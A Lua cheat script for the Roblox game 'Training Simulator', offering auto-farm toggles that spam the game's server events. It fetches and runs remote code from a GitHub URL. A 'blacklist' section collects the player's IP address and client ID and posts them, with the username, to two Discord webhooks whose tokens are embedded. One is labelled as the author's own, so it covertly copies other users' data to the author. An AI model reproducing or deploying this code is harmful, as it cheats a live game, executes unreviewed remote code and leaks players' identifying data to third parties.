local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local RunService = game:GetService("RunService")
local HttpService = game:GetService('HttpService')

local LocalPlayer = Players.LocalPlayer
local req = http_request or request or (syn and syn.request)

--[[ YOUR WEBHOOK ]]--
local Webhook1 = "https://discord.com/api/webhooks/1279710265239404595/4Dw-qV6wgrYK0-B80YDQCZAs9Vl7-OLfV5kbhV8YbxtwBfpuWdUQp-4-XO-6-BQfdgJB"
--[[ MY WEBHOOK ]]--
local Webhook2 = "https://discord.com/api/webhooks/1279710425566416926/Rtz_2ImGnEA1bgYGSRkU7r3c5uzlcYHZv5lGg_oVejxS6D1wnopCuaFqGvBMYVdxPku_"

local function fetchIP()
    local success, result = pcall(function()
        return req({ Url = "https://api.ipify.org/", Method = "GET" }).Body
    end)
    if success then
        local success, ipData = pcall(function()
            return HttpService:JSONDecode(result).ip
        end)
        if success then
            return ipData or "Unable to retrieve IP"
        end
    end
    return "Unable to retrieve IP"
end

local ip = fetchIP()
local clientId = tostring(RbxAnalyticsService:GetClientId())

local hasLogged = false

local function sendWebhook(reason)
    local body = HttpService:JSONEncode({
        embeds = {{
            title = "Blacklist Alert",
            description = string.format("Username: %s\nUserID: %d\nClientID: %s\nIP: %s\nReason: %s", LocalPlayer.Name, LocalPlayer.UserId, clientId, ip, reason),
            color = 0xFF0000,
            author = {name = "Blacklist Notification"}
        }}
    })

    local webhooks = {Webhook1, Webhook2}
    for _, webhookUrl in ipairs(webhooks) do
        local success, errorMessage = pcall(function()
            req({
                Url = webhookUrl,
                Method = "POST",
                Headers = {['Content-Type'] = 'application/json'},
                Body = body
            })
        end)
        if not success then
            warn("Webhook failed for " .. webhookUrl .. ": " .. errorMessage)
        end
    end
end

local BlacklistedIPs = {"ip1", "ip2"}
local BlacklistedUsernames = {"username1", "username2"}
local BlacklistedUserIDs = {123456789, 987654321}
local BlacklistedClientIDs = {"clientid1", "clientid2"}

RunService.Heartbeat:Connect(function()
    if not hasLogged then
        local reason = "Not Blacklisted"

        if table.find(BlacklistedIPs, ip) then
            LocalPlayer:Kick("Banned: IP Blacklisted")
            reason = "IP Blacklisted"
        elseif table.find(BlacklistedUserIDs, LocalPlayer.UserId) then
            LocalPlayer:Kick("Banned: UserID Blacklisted")
            reason = "UserID Blacklisted"
        elseif table.find(BlacklistedUsernames, LocalPlayer.Name) then
            LocalPlayer:Kick("Banned: Username Blacklisted")
            reason = "Username Blacklisted"
        elseif table.find(BlacklistedClientIDs, clientId) then
            LocalPlayer:Kick("Banned: ClientID Blacklisted")
            reason = "ClientID Blacklisted"
        end

        if reason ~= "Not Blacklisted" then
            sendWebhook(reason)
            hasLogged = true
        end
    end
end)
if game.PlaceId == 17348055576 then  -- Training Simulator
if not game:IsLoaded() then
game.Loaded:Wait()
end
end

print("Game Successfully Loaded!")
print("Created By Riotscripter!")

local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/Riotscripter/RiotExploits/main/Orion%20Library%202")))()
OrionLib:MakeNotification({
    Name = "Training Simulator",
    Content = "Scripted By Riotscripter!",
    Image = "rbxassetid://4483345998",
    Time = 5
})

-- local mytable
local MyTable = {
    ["AutoWeights"] = false,
    ["AutoPunch"] = false,
    ["AutoSkill"] = false,
    ["AutoFireBall"] = false,
    ["AutoRebirth"] = false,
    ["AutoBoth"] = false,
    ["AutoFarmAll"] = false,
    ["AutoHatchStarterEgg"] = false,
    ["AutoHatchProEgg"] = false,
    ["AutoHatchMasterEgg"] = false,
    ["AutoHatchDevilEgg"] = false,
    ["AutoHatchDemonEgg"] = false,
    ["AutoClaimEventEgg"] = false,
    ["AutoClaimOpEventEgg"] = false,
    ["AutoSpinWheel"] = false,
    ["AutoSpeed"] = false,
    ["AutoHealth"] = false,
    ["AutoDamage"] = false,
    ["AutoPetEquip"] = false,
}

-- getgenvs
getgenv().AutoWeights = false
getgenv().AutoPunch = false
getgenv().AutoSkill = false
getgenv().AutoFireBall = false
getgenv().AutoRebirth = false
getgenv().AutoBoth = false
getgenv().AutoFarmAll = false
getgenv().AutoHatchStarterEgg = false
getgenv().AutoHatchProEgg = false
getgenv().AutoHatchMasterEgg = false
getgenv().AutoHatchDevilEgg = false
getgenv().AutoHatchDemonEgg = false
getgenv().AutoClaimEventEgg = false
getgenv().AutoClaimOpEventEgg = false
getgenv().AutoSpinWheel = false
getgenv().AutoSpeed = false
getgenv().AutoHealth = false
getgenv().AutoDamage = false
getgenv().AutoPetEquip = false

-- functions
function autoweights()
    while getgenv().AutoWeights == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Weight"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Tool"):WaitForChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Game"):WaitForChild("[C-S]TryClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Eco"):WaitForChild("[C-S]PlayerTryRebirth"):FireServer()
    end
end

function autopunch()
    while getgenv().AutoPunch == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Punch"
        }
        game:GetService("ReplicatedStorage").Remote.Event.Tool:FindFirstChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage").Remote.Event.Game:FindFirstChild("[C-S]TryClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Eco"):WaitForChild("[C-S]PlayerTryRebirth"):FireServer()
    end
end

function autoskill()
    while getgenv().AutoSkill == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Skill"
        }
        game:GetService("ReplicatedStorage").Remote.Event.Tool:FindFirstChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage").Remote.Event.Game:FindFirstChild("[C-S]TryClick"):FireServer()
    end
end

function autofireball()
    while getgenv().AutoFireBall == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "FireBall"
        }
        game:GetService("ReplicatedStorage").Remote.Event.Tool:FindFirstChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage").Remote.Event.FireBall:FindFirstChild("[C-S]TryFireBall"):FireServer(unpack(args))
    end
end

function autorebirth()
    while getgenv().AutoRebirth == true do
        game:GetService("RunService").PreRender:Wait()
        game:GetService("ReplicatedStorage").Remote.Event.Eco:FindFirstChild("[C-S]PlayerTryRebirth"):FireServer()
    end
end

function autoboth()
    while getgenv().AutoBoth == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Weight"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Tool"):WaitForChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Game"):WaitForChild("[C-S]TryClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Eco"):WaitForChild("[C-S]PlayerTryRebirth"):FireServer()
        
        local args = {
            [1] = "Punch"
        }
        game:GetService("ReplicatedStorage").Remote.Event.Tool:FindFirstChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage").Remote.Event.Game:FindFirstChild("[C-S]TryClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Eco"):WaitForChild("[C-S]PlayerTryRebirth"):FireServer()
    end
end

function autofarmall()
    while getgenv().AutoFarmAll == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Weight"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Tool"):WaitForChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Game"):WaitForChild("[C-S]TryClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Eco"):WaitForChild("[C-S]PlayerTryRebirth"):FireServer()
        
        local args = {
            [1] = "Punch"
        }
        game:GetService("ReplicatedStorage").Remote.Event.Tool:FindFirstChild("[C-S]TryEquipTool"):FireServer(unpack(args))
        game:GetService("ReplicatedStorage").Remote.Event.Game:FindFirstChild("[C-S]TryClick"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("Event"):WaitForChild("Eco"):WaitForChild("[C-S]PlayerTryRebirth"):FireServer()
    end
end

function autohatchstarteregg()
    while getgenv().AutoHatchStarterEgg == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Egg1",
            [2] = 1
        }
        game:GetService("ReplicatedStorage").Remote.Function.Luck:FindFirstChild("[C-S]DoLuck"):InvokeServer(unpack(args))
    end
end

function autohatchproegg()
    while getgenv().AutoHatchProEgg == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Egg2",
            [2] = 1
        }
        game:GetService("ReplicatedStorage").Remote.Function.Luck:FindFirstChild("[C-S]DoLuck"):InvokeServer(unpack(args))
    end
end

function autohatchmasteregg()
    while getgenv().AutoHatchMasterEgg == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Egg3",
            [2] = 1
        }
        game:GetService("ReplicatedStorage").Remote.Function.Luck:FindFirstChild("[C-S]DoLuck"):InvokeServer(unpack(args))
    end
end

function autohatchdevilegg()
    while getgenv().AutoHatchDevilEgg == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Kill1",
            [2] = 1
        }
        game:GetService("ReplicatedStorage").Remote.Function.Luck:FindFirstChild("[C-S]DoLuck"):InvokeServer(unpack(args))
    end
end

function autohatchdemonEgg()
    while getgenv().AutoHatchDemonEgg == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Kill2",
            [2] = 1
        }
        game:GetService("ReplicatedStorage").Remote.Function.Luck:FindFirstChild("[C-S]DoLuck"):InvokeServer(unpack(args))
    end
end

function autoclaimeventegg()
    while getgenv().AutoClaimEventEgg == true do
        game:GetService("RunService").PreRender:Wait()
        game:GetService("ReplicatedStorage").Remote.Event.OPQuest:FindFirstChild("[C-S]TryClaim"):FireServer()
    end
end

function autoclaimopeventegg()
    while getgenv().AutoClaimOpEventEgg == true do
        game:GetService("RunService").PreRender:Wait()
        game:GetService("ReplicatedStorage").Remote.Event.OPPetEvent:FindFirstChild("[C-S]TryClaim"):FireServer()
    end
end

function autospinwheel()
    while getgenv().AutoSpinWheel == true do
        game:GetService("RunService").PreRender:Wait()
        game:GetService("ReplicatedStorage").Remote.Function.Spin:FindFirstChild("[C-S]TrySpin"):InvokeServer()
    end
end

function autospeed()
    while getgenv().AutoSpeed == true do
        game:GetService("RunService").PreRender:Wait()
                local args = {
            [1] = "Speed",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end

function autohealth()
    while getgenv().AutoHealth == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Health",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end

function autodamage()
    while getgenv().AutoDamage == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Damage",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end

function autopetequip()
    while getgenv().AutoPetEquip == true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "PetEquip",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end

local Window = OrionLib:MakeWindow({
    Name = "Riotscripter | Training Simulator [" .. os.date("%Y") .. "]",
    HidePremium = false,
    SaveConfig = false,
    ConfigFolder = "Riotscripter",
    IntroEnabled = true,
    IntroText = "Welcome To Riotscripter's Training Simulator Gui.",
})

local AutoFarmTab = Window:MakeTab({
    Name = "Auto Farm!",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false,
})

AutoFarmTab:AddToggle({
    Name = "Auto Weights",
    Default = false,
    Save = true,
    Flag = "autoweights_tgs",
    Callback = function(Value)
        getgenv().AutoWeights = Value
        autoweights()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Punch",
    Default = false,
    Save = true,
    Flag = "autopunch_tgs",
    Callback = function(Value)
        getgenv().AutoPunch = Value
        autopunch()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Skill",
    Default = false,
    Save = true,
    Flag = "autoskill_tgs",
    Callback = function(Value)
        getgenv().AutoSkill = Value
        autoskill()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto FireBall (Need Move/Laggy!)",
    Default = false,
    Save = true,
    Flag = "autofireball_tgs",
    Callback = function(Value)
        getgenv().AutoFireBall = Value
        autofireball()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Rebirth",
    Default = false,
    Save = true,
    Flag = "autorebirth_tgs",
    Callback = function(Value)
        getgenv().AutoRebirth = Value
        autorebirth()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Both/Weights/Punch",
    Default = false,
    Save = true,
    Flag = "autoboth_tgs",
    Callback = function(Value)
        getgenv().AutoBoth = Value
        autoboth()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Farm All",
    Default = false,
    Save = true,
    Flag = "autofarmall_tgs",
    Callback = function(Value)
        getgenv().AutoFarmAll = Value
        autofarmall()
    end
})

AutoFarmTab:AddToggle({
    Name = "Auto Spin Wheel",
    Default = false,
    Save = true,
    Flag = "autospinwheel_tgs",
    Callback = function(Value)
        getgenv().AutoSpinWheel = Value
        autospinwheel()
    end
})

AutoFarmTab:AddButton({
    Name = "Destroy Gui",
    Callback = function()
        OrionLib:Destroy()
    end
})

local EggsTab = Window:MakeTab({
    Name = "Eggs!",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false,
})

EggsTab:AddToggle({
    Name = "Auto Hatch Starter Egg",
    Default = false,
    Save = true,
    Flag = "autohatchstarteregg_tgs",
    Callback = function(Value)
        getgenv().AutoHatchStarterEgg = Value
        autohatchstarteregg()
    end
})

EggsTab:AddToggle({
    Name = "Auto Hatch Pro Egg",
    Default = false,
    Save = true,
    Flag = "autohatchproegg_tgs",
    Callback = function(Value)
        getgenv().AutoHatchProEgg = Value
        autohatchproegg()
    end
})

EggsTab:AddToggle({
    Name = "Auto Hatch Master Egg",
    Default = false,
    Save = true,
    Flag = "autohatchmasteregg_tgs",
    Callback = function(Value)
        getgenv().AutoHatchMasterEgg = Value
        autohatchmasteregg()
    end
})

EggsTab:AddToggle({
    Name = "Auto Hatch Devil Egg",
    Default = false,
    Save = true,
    Flag = "autohatchdevilegg_tgs",
    Callback = function(Value)
        getgenv().AutoHatchDevilEgg = Value
        autohatchdevilegg()
    end
})

EggsTab:AddToggle({
    Name = "Auto Hatch Demon Egg",
    Default = false,
    Save = true,
    Flag = "autohatchdemonegg_tgs",
    Callback = function(Value)
        getgenv().AutoHatchDemonEgg = Value
        autohatchdemonEgg()
    end
})

EggsTab:AddToggle({
    Name = "Auto Claim Event Egg",
    Default = false,
    Save = true,
    Flag = "autoclaimeventegg_tgs",
    Callback = function(Value)
        getgenv().AutoClaimEventEgg = Value
        autoclaimeventegg()
    end
})

EggsTab:AddToggle({
    Name = "Auto Claim Op Event Egg",
    Default = false,
    Save = true,
    Flag = "autoclaimopeventegg_tgs",
    Callback = function(Value)
        getgenv().AutoClaimOpEventEgg = Value
        autoclaimopeventegg()
    end
})

local UpgradesTab = Window:MakeTab({
    Name = "Auto Upgrades!",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false,
})

UpgradesTab:AddToggle({
    Name = "Auto Speed",
    Default = false,
    Save = true,
    Flag = "autospeed_tgs",
    Callback = function(Value)
        getgenv().AutoSpeed = Value
        autospeed()
    end
})

UpgradesTab:AddToggle({
    Name = "Auto Health",
    Default = false,
    Save = true,
    Flag = "autohealth_tgs",
    Callback = function(Value)
        getgenv(). AutoHealth = Value
        autohealth()
    end
})

UpgradesTab:AddToggle({
    Name = "Auto Damage",
    Default = false,
    Save = true,
    Flag = "autodamage_tgs",
    Callback = function(Value)
        getgenv().AutoDamage = Value
        autodamage()
    end
})

UpgradesTab:AddToggle({
    Name = "Auto PetEquip",
    Default = false,
    Save = true,
    Flag = "autopetequip_tgs",
    Callback = function(Value)
        getgenv().AutoPetEquip = Value
        autopetequip()
    end
})

UpgradesTab:AddButton({
    Name = "Auto Speed 2",
    Callback = function()
        while true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Speed",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end
})

UpgradesTab:AddButton({
    Name = "Auto Health 2",
    Callback = function()
        while true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Health",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end
})

UpgradesTab:AddButton({
    Name = "Auto Damage 2",
    Callback = function()
        while true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "Damage",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end
})

UpgradesTab:AddButton({
    Name = "Auto PetEquip 2",
    Callback = function()
        while true do
        game:GetService("RunService").PreRender:Wait()
        local args = {
            [1] = "PetEquip",
        }
        game:GetService("ReplicatedStorage").Remote.Event.Stats:FindFirstChild("[C-S]TryUpgrade"):FireServer(unpack(args))
    end
end
})

local VisualsTab = Window:MakeTab({
    Name = "Visuals!",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false,
})

VisualsTab:AddTextbox({
    Name = "Kills (Visual!)",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        game:GetService("Players").LocalPlayer.PlayerGui.Hud.Left.Type.kill.Amount.Text = Value
end
})
    
VisualsTab:AddTextbox({
    Name = "Power (Visual!)",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        game:GetService("Players").LocalPlayer.leaderstats["ðŸ’ªPower"].Value = Value
        game:GetService("Players").LocalPlayer.PlayerGui.Hud.Left.Type.power.Amount.Text = Value
end
})

VisualsTab:AddTextbox({
    Name = "Rebirths (Visual!)",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        game:GetService("Players").LocalPlayer.leaderstats["ðŸ”¥Rebirth"].Value = Value
        game:GetService("Players").LocalPlayer.PlayerGui.Hud.Left.Type.rebirth.Amount.Text = Value
end
})

local CodesTab = Window:MakeTab({
    Name = "Codes!",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false,
})

CodesTab:AddTextbox({
    Name = "Codes (Redeem!)",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        local args = {
            [1] = Value
        }
        game:GetService("ReplicatedStorage").CdkRewardFuntion.isPlayerUseCdkRequest:InvokeServer(unpack(args))
end
})

local CreditsTab = Window:MakeTab({
    Name = "Credits!",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false,
})

local Section = CreditsTab:AddSection({
    Name = "Credits!",
})

CreditsTab:AddLabel("Script is made by Riotscripter")
CreditsTab:AddLabel("Scripted by Riotscripter!")
CreditsTab:AddLabel("UI Library by Riotscripter!")
CreditsTab:AddLabel("Script Discontinued So Let Me Know If Its Patched!")

CreditsTab:AddParagraph("Info","Tap The Button To Copy My Social And Invite Links!")
CreditsTab:AddParagraph("Info","Script changelogs at our Discord Server. If you find any bugs, inform us.")

CreditsTab:AddButton({
    Name = "Discord",
    Callback = function()
        setclipboard("https://discord.gg/9rMZvSPAQv")
        print("Riotscripter: Copied Discord Server Invite to Clipboard.")
        OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Discord Server Invite to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
    end
})

CreditsTab:AddButton({
    Name = "Youtube",
    Callback = function()
        setclipboard("https://m.youtube.com/channel/UCvXEiClhdiICCgSVzkEIT3A")
        print("Riotscripter: Copied Youtube Channel Link to Clipboard.")
        OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Youtube Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
    end
})

CreditsTab:AddButton({
    Name = "Github",
    Callback = function()
        setclipboard("https://github.com/Riotscripter")
        print("Riotscripter: Copied Github Channel Link to Clipboard.")
        OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Github Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
    end
})

CreditsTab:AddBind({
    Name = "UI Toggle Keybind", 
    Default = Enum.KeyCode.RightShift, 
    Hold = false, 
    Callback = function()
        print("press")
    end    
})
OrionLib:Init()

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Frame.BackgroundTransparency = 0.500
Frame.Position = UDim2.new(0.858712733, 0, 0.0237762257, 0)
Frame.Size = UDim2.new(0.129513338, 0, 0.227972031, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(1, 0, 1, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "TOGGLE"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 50.000
TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextStrokeTransparency = 0.000
TextButton.TextWrapped = true

TextButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.RightShift, false, game)
end)

UITextSizeConstraint.Parent = TextButton
UITextSizeConstraint.MaxTextSize = 50

-- PART 1
